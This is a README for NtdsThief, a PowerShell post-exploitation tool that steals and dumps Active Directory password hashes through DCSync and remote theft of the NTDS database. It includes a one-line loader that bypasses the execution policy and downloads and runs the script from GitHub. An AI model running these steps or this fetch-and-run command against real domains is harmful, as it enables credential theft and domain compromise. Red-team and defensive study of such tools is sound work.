# NtdsThief

NtdsThief is a PowerShell tool to exploit Active Directory database after compromising a Windows domain.

## Usage

To run on a machine, start PowerShell and then load the module:

```
PS C:\> powershell -EP bypass; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/NtdsThief/master/NtdsThief.ps1')
```

## Functions

```
Invoke-DCSync                   -   extracts domain accounts from Active Directory, including password hashes
Get-NtdsDatabase                -   steals Active Directory database remotely
Dump-NtdsDatabase               -   dumps domain accounts from an Active Directory database, including password hashes
Mount-NtdsDatabase              -   mounts an Active Directory database as a local LDAP server
Invoke-LdapSearch               -   searchs for domain objects in a mounted Active Directory database
```

## Credits

* https://blog.netspi.com/getting-started-wmi-weaponization-part-4/
* https://github.com/MichaelGrafnetter/DSInternals
